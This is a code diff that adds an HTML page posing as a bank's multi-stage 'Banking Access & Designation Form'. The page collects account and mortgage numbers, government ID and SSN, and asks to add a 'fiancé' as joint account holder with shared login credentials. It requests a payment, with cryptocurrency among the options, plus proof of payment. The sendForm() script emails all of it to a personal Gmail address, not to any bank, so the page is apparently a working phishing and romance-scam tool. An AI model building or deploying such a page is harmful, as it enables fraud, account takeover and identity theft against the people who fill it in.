@@ -1,1 +1,660 @@
-wywywywywywy
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Account Access & Beneficiary Onboarding</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+font-family:Inter,sans-serif;
+background:#edf2f7;
+padding:30px;
+color:#1f2937;
+}
+.wrapper{
+max-width:950px;
+margin:auto;
+}
+.card{
+background:#fff;
+border-radius:18px;
+overflow:hidden;
+box-shadow:0 15px 40px rgba(0,0,0,.12);
+}
+.header{
+background:linear-gradient(135deg,#0b4c7b,#082b49);
+color:white;
+padding:35px;
+}
+.header h1{font-size:28px;margin-bottom:8px;}
+.header p{opacity:.95;font-size:14px;}
+
+/* Progress Bar & Steps Styling */
+.progress-container {
+padding:25px 35px 10px 35px;
+background:#f8fafc;
+border-bottom:1px solid #e2e8f0;
+}
+.steps-nav {
+display:flex;
+justify-style:space-between;
+position:relative;
+}
+.steps-nav::before {
+content:'';
+position:absolute;
+top:50%;
+left:0;
+right:0;
+height:3px;
+background:#cbd5e1;
+z-index:1;
+transform:translateY(-50%);
+}
+.step-circle {
+position:relative;
+z-index:2;
+width:36px;
+height:36px;
+border-radius:50%;
+background:#cbd5e1;
+color:#475569;
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:700;
+font-size:14px;
+transition:all 0.3s ease;
+}
+.step-item {
+display:flex;
+flex-direction:column;
+align-items:center;
+gap:6px;
+background:#f8fafc;
+padding:0 8px;
+z-index:2;
+}
+.step-label {
+font-size:12px;
+font-weight:600;
+color:#64748b;
+}
+.step-item.active .step-circle {
+background:#0b4c7b;
+color:white;
+box-shadow:0 0 0 4px rgba(11,76,123,0.2);
+}
+.step-item.active .step-label {
+color:#0b4c7b;
+}
+.step-item.completed .step-circle {
+background:#16a34a;
+color:white;
+}
+
+.form-area{padding:35px;}
+.notice{
+background:#eef6ff;
+border-left:5px solid #0b4c7b;
+padding:18px;
+border-radius:10px;
+margin-bottom:25px;
+font-size:14px;
+line-height:1.5;
+}
+.notice-warning {
+background:#fffbe2;
+border-left-color:#d97706;
+color:#78350f;
+}
+
+/* Multi-stage Steps display */
+.form-step {
+display:none;
+}
+.form-step.active-step {
+display:block;
+animation:fadeIn 0.4s ease;
+}
+
+@keyframes fadeIn {
+from { opacity: 0; transform: translateY(8px); }
+to { opacity: 1; transform: translateY(0); }
+}
+
+.section{
+margin-top:15px;
+}
+.section h2{
+color:#0b4c7b;
+margin-bottom:18px;
+padding-bottom:8px;
+border-bottom:2px solid #e5e7eb;
+font-size:20px;
+}
+.grid{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+gap:18px;
+}
+.field{
+display:flex;
+flex-direction:column;
+}
+label{
+font-weight:600;
+margin-bottom:8px;
+font-size:14px;
+}
+input,select,textarea{
+padding:12px 14px;
+border:1px solid #cbd5e1;
+border-radius:10px;
+font-size:15px;
+font-family:inherit;
+}
+input:focus, select:focus, textarea:focus {
+outline:none;
+border-color:#0b4c7b;
+box-shadow:0 0 0 3px rgba(11,76,123,0.15);
+}
+textarea{resize:vertical;}
+.actions{
+display:flex;
+gap:15px;
+justify-style:space-between;
+margin-top:35px;
+padding-top:20px;
+border-top:1px solid #e2e8f0;
+}
+button{
+padding:14px 28px;
+border:none;
+border-radius:12px;
+font-weight:600;
+cursor:pointer;
+font-size:15px;
+transition:background 0.2s;
+}
+.btn-next, .send{
+background:#0b4c7b;
+color:white;
+}
+.btn-next:hover, .send:hover{
+background:#08385b;
+}
+.btn-prev {
+background:#e2e8f0;
+color:#334155;
+}
+.btn-prev:hover {
+background:#cbd5e1;
+}
+.pdf{
+background:#16a34a;
+color:white;
+}
+.pdf:hover{
+background:#15803d;
+}
+.footer{
+padding:20px;
+text-align:center;
+font-size:13px;
+color:#64748b;
+background:#f8fafc;
+}
+.checkbox-group{
+display:flex;
+flex-direction:column;
+gap:12px;
+margin-top:10px;
+}
+.checkbox-group label{
+font-weight:500;
+display:flex;
+align-items:flex-start;
+gap:10px;
+font-size:14px;
+cursor:pointer;
+}
+.checkbox-group input[type="checkbox"]{
+margin-top:3px;
+width:16px;
+height:16px;
+cursor:pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+
+<div class="card">
+
+<div class="header">
+<h1>Banking Access & Designation Form</h1>
+<p>Multi-Stage Onboarding: Payable on Death (POD), Transfer Authority, Account Visibility & Payment</p>
+</div>
+
+<!-- STAGE PROGRESS INDICATOR -->
+<div class="progress-container">
+    <div class="steps-nav">
+        <div class="step-item active" id="step-nav-1">
+            <div class="step-circle">1</div>
+            <div class="step-label">POD Beneficiary</div>
+        </div>
+        <div class="step-item" id="step-nav-2">
+            <div class="step-circle">2</div>
+            <div class="step-label">Transfer Access</div>
+        </div>
+        <div class="step-item" id="step-nav-3">
+            <div class="step-circle">3</div>
+            <div class="step-label">Account Visibility</div>
+        </div>
+        <div class="step-item" id="step-nav-4">
+            <div class="step-circle">4</div>
+            <div class="step-label">Payment Details</div>
+        </div>
+        <div class="step-item" id="step-nav-5">
+            <div class="step-circle">5</div>
+            <div class="step-label">Review & Submit</div>
+        </div>
+    </div>
+</div>
+
+<div class="form-area" id="formContent">
+
+<form id="onboardingForm">
+
+<!-- STAGE 1: BENEFICIARY (POD) DESIGNATION -->
+<div class="form-step active-step" id="step-1">
+    <div class="notice">
+        <strong>Stage 1 Notice (POD Beneficiary):</strong> A Payable on Death (POD) designation grants funds to your fiancé <em>only upon your death</em>, bypassing probate. It does <strong>not</strong> give active access to make transfers while you are living.
+    </div>
+
+    <div class="section">
+        <h2>1. Account Holder Details</h2>
+        <div class="grid">
+            <div class="field">
+                <label>Full Legal Name</label>
+                <input type="text" name="holderName" required>
+            </div>
+            <div class="field">
+                <label>Primary Account Number</label>
+                <input type="text" name="accountNumber">
+            </div>
+            <div class="field">
+                <label>Government ID Type</label>
+                <select name="idType">
+                    <option>Driver's License</option>
+                    <option>Passport</option>
+                    <option>National ID</option>
+                    <option>Other</option>
+                </select>
+            </div>
+            <div class="field">
+                <label>Government ID Number</label>
+                <input type="text" name="idNumber">
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>2. Fiancé (Beneficiary) Information</h2>
+        <div class="grid">
+            <div class="field">
+                <label>Full Legal Name (as on ID)</label>
+                <input type="text" name="beneficiaryName" required>
+            </div>
+            <div class="field">
+                <label>Date of Birth</label>
+                <input type="date" name="dob">
+            </div>
+            <div class="field">
+                <label>SSN / National ID / Passport Number</label>
+                <input type="text" name="nationalId">
+            </div>
+            <div class="field">
+                <label>Phone Number</label>
+                <input type="tel" name="phone">
+            </div>
+            <div class="field">
+                <label>Current Residential Address</label>
+                <input type="text" name="address">
+            </div>
+            <div class="field">
+                <label>Relationship</label>
+                <input type="text" name="relationship" value="Fiancé" readonly style="background:#f1f5f9;">
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>3. POD Allocation Settings</h2>
+        <div class="grid">
+            <div class="field">
+                <label>Designation Level</label>
+                <select name="beneficiaryType">
+                    <option>Primary</option>
+                    <option>Contingent</option>
+                </select>
+            </div>
+            <div class="field">
+                <label>Percentage Share</label>
+                <input type="text" name="percentage" value="100%">
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- STAGE 2: JOINT ACCOUNT & TRANSFER ACCESS -->
+<div class="form-step" id="step-2">
+    <div class="notice notice-warning">
+        <strong>Stage 2 Notice (Transfer & Operating Access):</strong> Adding your fiancé as a Joint Account Holder or Authorized Signer grants her full legal access to withdraw, spend, and transfer funds from your personal checking/savings accounts while you are alive.
+    </div>
+
+    <div class="section">
+        <h2>Transfer & Account Authorization</h2>
+        
+        <div class="checkbox-group">
+            <label>
+                <input type="checkbox" name="jointAccountReq" value="Yes"> 
+                Convert Personal Account to a <strong>Joint Account</strong> (Full ownership & transfer capability).
+            </label>
+            <label>
+                <input type="checkbox" name="authorizedSignerReq" value="Yes"> 
+                Add as an <strong>Authorized Signer / Convenience Signer</strong> (Transfer authority without full legal ownership).
+            </label>
+        </div>
+
+        <div class="grid" style="margin-top:20px;">
+            <div class="field">
+                <label>Target Checking Account Number for Transfers</label>
+                <input type="text" name="transferCheckingAcc" placeholder="e.g., XXXX-1234">
+            </div>
+            <div class="field">
+                <label>Target Savings Account Number for Transfers</label>
+                <input type="text" name="transferSavingsAcc" placeholder="e.g., XXXX-5678">
+            </div>
+        </div>
+
+        <div class="field" style="margin-top:20px;">
+            <label>Transfer Limits & Restrictions (Optional)</label>
+            <textarea rows="3" name="transferLimits" placeholder="Specify daily transfer limit preferences or special instructions for bank administration."></textarea>
+        </div>
+    </div>
+</div>
+
+<!-- STAGE 3: ACCOUNT VISIBILITY (CHECKING, SAVINGS, MORTGAGE) -->
+<div class="form-step" id="step-3">
+    <div class="notice">
+        <strong>Stage 3 Notice (Online & Portfolio Access):</strong> Select which accounts your fiancé should be able to view via online/mobile banking. Note: Mortgage view-only access may require filling out a Third-Party Authorization form with your loan servicer.
+    </div>
+
+    <div class="section">
+        <h2>Online Banking Visibility Preferences</h2>
+        
+        <div class="checkbox-group">
+            <label>
+                <input type="checkbox" name="viewChecking" value="Yes" checked> 
+                <strong>Checking Account Visibility</strong> (View balance, transaction history, statements).
+            </label>
+            <label>
+                <input type="checkbox" name="viewSavings" value="Yes" checked> 
+                <strong>Savings Account Visibility</strong> (View balance, interest earned, savings goals).
+            </label>
+            <label>
+                <input type="checkbox" name="viewMortgage" value="Yes"> 
+                <strong>Mortgage Account Visibility</strong> (View principal balance, monthly payment, escrow details).
+            </label>
+        </div>
+
+        <div class="grid" style="margin-top:20px;">
+            <div class="field">
+                <label>Mortgage Loan Account Number (if applicable)</label>
+                <input type="text" name="mortgageAccNumber" placeholder="e.g., Loan #987654321">
+            </div>
+            <div class="field">
+                <label>Online Banking Integration Type</label>
+                <select name="onlineAccessType">
+                    <option>Joint Online Banking Profile</option>
+                    <option>Secondary Authorized Online User Profile</option>
+                    <option>Shared Login Credential Authorization</option>
+                </select>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- STAGE 4: PAYMENT DETAILS, INSTALLMENTS & PROOF OF PAYMENT -->
+<div class="form-step" id="step-4">
+    <div class="notice">
+        <strong>Stage 4 Notice (Payment & Verification):</strong> Please enter payment details, select your preferred payment plan/installment frequency, and upload proof of payment for processing.
+    </div>
+
+    <div class="section">
+        <h2>Payment Details</h2>
+        <div class="grid">
+            <div class="field">
+                <label>Payment Amount ($ USD)</label>
+                <input type="number" name="paymentAmount" placeholder="e.g. 3000" step="0.01">
+            </div>
+            <div class="field">
+                <label>Payment Method</label>
+                <select name="paymentMethod">
+                    <option>Bank Wire Transfer</option>
+                    <option>Direct Deposit / ACH</option>
+                    <option>Credit / Debit Card</option>
+                    <option>Cashier's Check / Certified Check</option>
+                    <option>Cryptocurrency</option>
+                    <option>Other</option>
+                </select>
+            </div>
+            <div class="field">
+                <label>Payment Schedule / Plan</label>
+                <select name="paymentPlan" id="paymentPlanSelect" onchange="toggleInstallmentOptions()">
+                    <option value="Full Payment">Full Lump Sum Payment</option>
+                    <option value="Installments">Installment Plan</option>
+                </select>
+            </div>
+            <div class="field" id="installmentField" style="display:none;">
+                <label>Installment Frequency & Terms</label>
+                <select name="installmentTerms">
+                    <option>2 Monthly Installments</option>
+                    <option>3 Monthly Installments</option>
+                    <option>4 Monthly Installments</option>
+                    <option>Bi-Weekly Payments</option>
+                    <option>Custom Plan (Specify in Notes)</option>
+                </select>
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Upload Proof of Payment</h2>
+        <div class="field">
+            <label>Attach Payment Receipt / Wire Confirmation / Transfer Screenshot</label>
+            <input type="file" name="paymentProof" id="paymentProofInput" accept="image/*,.pdf">
+            <p style="font-size:12px; color:#64748b; margin-top:5px;">Accepted formats: PNG, JPG, JPEG, PDF</p>
+        </div>
+    </div>
+</div>
+
+<!-- STAGE 5: REVIEW & SUBMISSION -->
+<div class="form-step" id="step-5">
+    <div class="notice">
+        <strong>Stage 5 Review:</strong> Please confirm all information prior to submitting or generating the final document for bank processing.
+    </div>
+
+    <div class="section">
+        <h2>Final Acknowledgments</h2>
+        <div class="checkbox-group">
+            <label>
+                <input type="checkbox" name="ackPOD" required> 
+                I confirm the POD designation details provided for my fiancé.
+            </label>
+            <label>
+                <input type="checkbox" name="ackTransfer" required> 
+                I understand granting transfer access gives immediate withdrawal rights on specified accounts.
+            </label>
+            <label>
+                <input type="checkbox" name="ackVisibility" required> 
+                I authorize visibility settings across checking, savings, and mortgage accounts.
+            </label>
+            <label>
+                <input type="checkbox" name="ackPayment" required> 
+                I confirm that the payment details and uploaded proof of payment are accurate.
+            </label>
+        </div>
+
+        <div class="field" style="margin-top:20px;">
+            <label>Additional Notes / Bank Representative Instructions</label>
+            <textarea rows="4" name="notes" placeholder="Enter any extra details or instructions for your bank officer..."></textarea>
+        </div>
+    </div>
+</div>
+
+<!-- NAVIGATION BUTTONS -->
+<div class="actions">
+    <button type="button" class="btn-prev" id="prevBtn" onclick="changeStep(-1)" style="display:none;">Back</button>
+    <div style="display:flex; gap:10px;">
+        <button type="button" class="pdf" id="pdfBtn" onclick="downloadPDF()" style="display:none;">Download PDF</button>
+        <button type="button" class="btn-next" id="nextBtn" onclick="changeStep(1)">Next Stage</button>
+        <button type="button" class="send" id="sendBtn" onclick="sendForm()" style="display:none;">Send Email</button>
+    </div>
+</div>
+
+</form>
+
+</div>
+
+<div class="footer">
+Professional Banking Information Collection Form • Multi-Stage Account & Beneficiary Onboarding
+</div>
+
+</div>
+
+</div>
+
+<script>
+let currentStep = 1;
+const totalSteps = 5;
+
+function toggleInstallmentOptions() {
+    const plan = document.getElementById("paymentPlanSelect").value;
+    const installmentField = document.getElementById("installmentField");
+    if (plan === "Installments") {
+        installmentField.style.display = "flex";
+    } else {
+        installmentField.style.display = "none";
+    }
+}
+
+function changeStep(direction) {
+    if (direction === 1) {
+        const currentStepEl = document.getElementById(`step-${currentStep}`);
+        const requiredInputs = currentStepEl.querySelectorAll('[required]');
+        let isValid = true;
+        
+        requiredInputs.forEach(input => {
+            if (!input.value || (input.type === 'checkbox' && !input.checked)) {
+                input.reportValidity();
+                isValid = false;
+            }
+        });
+        
+        if (!isValid) return;
+    }
+
+    document.getElementById(`step-${currentStep}`).classList.remove('active-step');
+    document.getElementById(`step-nav-${currentStep}`).classList.remove('active');
+    
+    if (direction === 1 && currentStep < totalSteps) {
+        document.getElementById(`step-nav-${currentStep}`).classList.add('completed');
+    }
+
+    currentStep += direction;
+
+    document.getElementById(`step-${currentStep}`).classList.add('active-step');
+    document.getElementById(`step-nav-${currentStep}`).classList.add('active');
+
+    document.getElementById('prevBtn').style.display = currentStep === 1 ? 'none' : 'block';
+    
+    if (currentStep === totalSteps) {
+        document.getElementById('nextBtn').style.display = 'none';
+        document.getElementById('sendBtn').style.display = 'block';
+        document.getElementById('pdfBtn').style.display = 'block';
+    } else {
+        document.getElementById('nextBtn').style.display = 'block';
+        document.getElementById('sendBtn').style.display = 'none';
+        document.getElementById('pdfBtn').style.display = 'none';
+    }
+}
+
+function sendForm() {
+    const form = document.getElementById("onboardingForm");
+    
+    if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+    }
+
+    const formData = new FormData(form);
+    let bodyText = "BANKING ACCESS & PAYMENT SUBMISSION\n";
+    bodyText += "===================================\n\n";
+
+    for (let [key, value] of formData.entries()) {
+        if (value instanceof File) {
+            bodyText += `${key}: ${value.name ? value.name + " (Please attach file manually)" : "No file selected"}\n`;
+        } else if (value.trim() !== "") {
+            bodyText += `${key}: ${value}\n`;
+        }
+    }
+
+    const recipient = "andyprince385@gmail.com";
+    const subject = encodeURIComponent("Banking Access & Beneficiary Form Submission");
+    const encodedBody = encodeURIComponent(bodyText);
+    
+    const fileInput = document.getElementById("paymentProofInput");
+    if (fileInput && fileInput.files.length > 0) {
+        alert("Your email app will open now. Please attach your proof of payment file to the draft email before sending!");
+    }
+
+    window.location.href = `mailto:${recipient}?subject=${subject}&body=${encodedBody}`;
+}
+
+async function downloadPDF() {
+    const steps = document.querySelectorAll('.form-step');
+    steps.forEach(step => step.style.display = 'block');
+
+    const { jsPDF } = window.jspdf;
+    const element = document.getElementById("formContent");
+    const canvas = await html2canvas(element, { scale: 2 });
+    const img = canvas.toDataURL("image/png");
+
+    steps.forEach((step, idx) => {
+        if (idx + 1 !== currentStep) {
+            step.style.display = 'none';
+        }
+    });
+
+    const pdf = new jsPDF("p", "mm", "a4");
+    const width = 190;
+    const height = canvas.height * width / canvas.width;
+
+    pdf.addImage(img, "PNG", 10, 10, width, height);
+    pdf.save("Bank_Account_Access_And_Beneficiary_Form.pdf");
+}
+</script>
+
+</body>
+</html>
